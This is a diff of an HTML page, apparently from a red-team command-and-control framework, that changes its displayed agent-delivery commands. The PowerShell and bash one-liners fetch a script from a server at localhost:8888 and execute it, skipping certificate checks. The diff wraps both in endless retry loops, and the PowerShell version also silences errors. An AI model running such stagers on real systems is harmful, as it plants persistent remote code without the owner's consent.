@@ -48,8 +48,8 @@
                             </p>
                             <br>
                             <div>
-                                <pre id="pshDelivery">$url="https://localhost:8888/file/render"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);}</pre>
-                                <pre id="bashDelivery">eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render)"</pre>
+                                <pre id="pshDelivery">while($true) {$ErrorActionPreference='SilentlyContinue';$url="https://localhost:8888/file/render"; $ps_table = $PSVersionTable.PSVersion;If([double]$ps_table.Major -ge 6){iex (irm -Method Post -Uri $url -Headers @{"file"="54ndc47.ps1"} -SkipCertificateCheck);}else{[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};$web=New-Object System.Net.WebClient;$web.Headers.Add("file","54ndc47.ps1");$resp=$web.UploadString("$url",'');iex($resp);};sleep 60}</pre>
+                                <pre id="bashDelivery">while true; do eval "$(curl -sk -X POST -H "file:54ndc47.sh" https://localhost:8888/file/render)"; sleep 60; done</pre>
                             </div>
                         </div>
                     </center>
